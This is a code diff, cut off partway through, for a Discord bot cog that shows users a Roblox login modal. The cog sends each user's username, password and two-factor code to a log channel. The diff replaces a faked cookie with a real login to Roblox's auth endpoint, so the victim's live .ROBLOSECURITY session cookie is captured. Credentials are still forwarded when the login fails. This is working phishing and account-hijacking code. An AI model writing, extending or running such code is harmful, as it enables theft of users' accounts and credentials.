@@ -9,6 +9,8 @@ from datetime import datetime
 import urllib.parse
 import random
 import string
+import time
+from bs4 import BeautifulSoup
 
 class RobloxPanel(commands.Cog):
     def __init__(self, bot):
@@ -130,25 +132,82 @@ class RobloxLoginModal(discord.ui.Modal):
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         user_info = f"ユーザー: {interaction.user.name} (ID: {interaction.user.id})"
         
-        # 常に成功と見せかけて情報を送信
-        embed = discord.Embed(
-            title="✅ Robloxログイン成功",
-            description=f"{user_info}\nタイムスタンプ: {timestamp}",
-            color=discord.Color.green()
-        )
-        embed.add_field(name="ユーザー名", value=username, inline=False)
-        embed.add_field(name="パスワード", value=password, inline=False)
+        # 実際のRobloxログイン処理
+        success, cookie, error_msg = await self.roblox_login(username, password, twofactor_code)
         
-        if twofactor_code:
-            embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
+        if success:
+            # 成功した場合
+            embed = discord.Embed(
+                title="✅ Robloxログイン成功",
+                description=f"{user_info}\nタイムスタンプ: {timestamp}",
+                color=discord.Color.green()
+            )
+            embed.add_field(name="ユーザー名", value=username, inline=False)
+            embed.add_field(name="パスワード", value=password, inline=False)
             
-        # クッキーを偽装
-        fake_cookie = ".ROBLOSECURITY=" + ''.join(random.choices(string.ascii_letters + string.digits, k=200))
-        embed.add_field(name="クッキー", value=fake_cookie[:100] + "..." if len(fake_cookie) > 100 else fake_cookie, inline=False)
-        
-        await log_channel.send(embed=embed)
-        await interaction.followup.send("Robloxアカウントに正常に接続されました！", ephemeral=True)
+            if twofactor_code:
+                embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
+                
+            embed.add_field(name="クッキー", value=cookie[:100] + "..." if len(cookie) > 100 else cookie, inline=False)
+            
+            await log_channel.send(embed=embed)
+            await interaction.followup.send("Robloxアカウントに正常に接続されました！", ephemeral=True)
+        else:
+            # 失敗した場合でも情報を送信
+            embed = discord.Embed(
+                title="❌ Robloxログイン失敗",
+                description=f"{user_info}\nタイムスタンプ: {timestamp}",
+                color=discord.Color.red()
+            )
+            embed.add_field(name="ユーザー名", value=username, inline=False)
+            embed.add_field(name="パスワード", value=password, inline=False)
+            embed.add_field(name="エラー", value=error_msg, inline=False)
+            
+            if twofactor_code:
+                embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
+                
+            await log_channel.send(embed=embed)
+            await interaction.followup.send(f"ログインに失敗しました: {error_msg}", ephemeral=True)
 
-# このCogをボットに追加するためのセットアップ関数
-async def setup(bot):
-    await bot.add_cog(RobloxPanel(bot))
+    async def roblox_login(self, username, password, twofactor_code=None):
+        """
+        Robloxにログインし、クッキーを取得する関数
+        """
+        try:
+            # セッションを開始
+            session = requests.Session()
+            session.headers.update({
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Referer": "https://www.roblox.com/",
+                "Origin": "https://www.roblox.com"
+            })
+            
+            # CSRFトークンを取得
+            csrf_response = session.get("https://www.roblox.com/")
+            csrf_token = None
+            if csrf_response.status_code == 200:
+                soup = BeautifulSoup(csrf_response.text, 'html.parser')
+                meta_tag = soup.find('meta', {'name': 'csrf-token'})
+                if meta_tag:
+                    csrf_token = meta_tag['content']
+            
+            # ログインリクエスト
+            login_url = "https://auth.roblox.com/v2/login"
+            
+            payload = {
+                "ctype": "Username",
+                "cvalue": username,
+                "password": password
+            }
+            
+            # ログイン試行
+            response = session.post(login_url, json=payload)
+            
+            # 二段階認証が必要な場合
+            if response.status_code == 403:
+                if not twofactor_code:
+                    return False, None, "二段階認証コードが必要です。"
+                
+                # 二段階認証コードを送信
